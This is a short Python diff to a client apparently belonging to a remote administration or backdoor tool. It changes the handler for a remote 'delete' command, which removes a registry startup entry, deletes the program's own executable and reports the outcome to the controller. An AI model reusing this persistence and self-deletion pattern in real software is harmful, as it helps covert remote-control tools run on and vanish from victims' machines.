@@ -155,12 +155,15 @@ class client:
 
                 elif message[PK_COMMAND_FLAG] == COMMAND_DELETE:
                     return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
-                    return_message[PK_PAYLOAD_FLAG] = "Delete process initiated."
+                    return_message[PK_PAYLOAD_FLAG] = "Delete process initiated. {}".format(sys.argv[0])
                     self.send_list.put(return_message)
-
-                    regedit.removeStartup()
-                    os.remove(sys.argv[0])
-
+                    try:
+                        regedit.removeStartup()
+                        os.remove(sys.argv[0])
+                    except Exception as e:
+                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                        return_message[PK_PAYLOAD_FLAG] = "Delete process Failed: {}".format(e)
+                        self.send_list.put(return_message)
                 else:
                     return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                     return_message[PK_PAYLOAD_FLAG] = "Unknown command. Type HLP to get Help"
